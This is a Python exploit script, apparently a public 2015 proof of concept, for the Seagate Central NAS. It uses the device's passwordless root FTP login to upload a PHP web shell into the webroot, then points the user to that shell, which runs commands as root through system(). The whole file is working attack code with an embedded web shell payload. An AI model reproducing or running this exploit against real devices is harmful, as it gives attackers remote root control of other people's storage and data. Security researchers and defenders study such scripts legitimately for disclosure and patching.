#!/usr/bin/python
# seagate_ftp_remote_root.py
#
# Seagate Central Remote Root Exploit
#
# Jeremy Brown [jbrown3264/gmail]
# May 2015
#
# -Synopsis-
#
# Seagate Central by default has a passwordless root account (and no option to change it).
# One way to exploit this is to log into it's ftp server and upload a php shell to the webroot.
# From there, we can execute commands with root privileges as lighttpd is also running as root.
#
# -Fixes-
#
# Seagate scheduled it's updates to go live on April 28th, 2015.
#
# Tested Firmware Version: 2014.0410.0026-F
#

import sys
from ftplib import FTP

port = 21

php_shell = """
<?php
if(isset($_REQUEST['cmd']))
{
    $cmd = ($_REQUEST["cmd"]);
    echo "<pre>$cmd</pre>";
    system($cmd);
}
?>
"""

php_shell_filename = "shell.php"
seagate_central_webroot = "/cirrus/"

def main():
    if(len(sys.argv) < 2):
        print("Usage: %s <host>" % sys.argv[0])
        return

    host = sys.argv[1]

    try:
        with open(php_shell_filename, 'w') as file:
            file.write(php_shell)

    except Exception as error:
        print("Error: %s" % error);
        return

    try:
        ftp = FTP(host)
        ftp.login("root")
        ftp.storbinary("STOR " + seagate_central_webroot + php_shell_filename, open(php_shell_filename, 'rb'))
        ftp.close()
    
    except Exception as error:
        print("Error: %s" % error);
        return

    print("Now surf on over to http://%s%s%s for the php root shell" % (host, seagate_central_webroot, php_shell_filename))

    return

if __name__ == "__main__":
    main()
